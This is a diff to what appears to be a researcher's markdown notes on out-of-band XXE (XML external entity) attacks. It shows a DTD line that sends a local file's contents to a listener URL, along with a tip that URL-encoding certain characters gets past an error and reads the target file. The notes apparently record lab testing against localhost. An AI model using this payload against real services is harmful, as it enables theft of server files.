@@ -38,13 +38,18 @@ The original xml content is as follows:
 ]>
 <root>&send;</root>
 ```
+but if we use this content directly, we will end up with a expection liks this:
+![](imgs/sc_20190828162051.png)
+if we urlencode `%`, `;` and `&`, we will successfully read the content of the target file.
+![](imgs/sc_20190828162401.png)
 while the content of `/Users/Shared/cccc` is: `shadowsock5`.
 while the content of `http://127.0.0.1:8000/xxe.dtd` is:
 ```xml
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8888/?content=%file;'>">
 ```
-
+Demo:
+![](imgs/sc_20190828163109.png)
 
 #### Ref
-http://ceye.io/payloads
-https://blog.csdn.net/u011721501/article/details/43775691
+- http://ceye.io/payloads
+- https://blog.csdn.net/u011721501/article/details/43775691
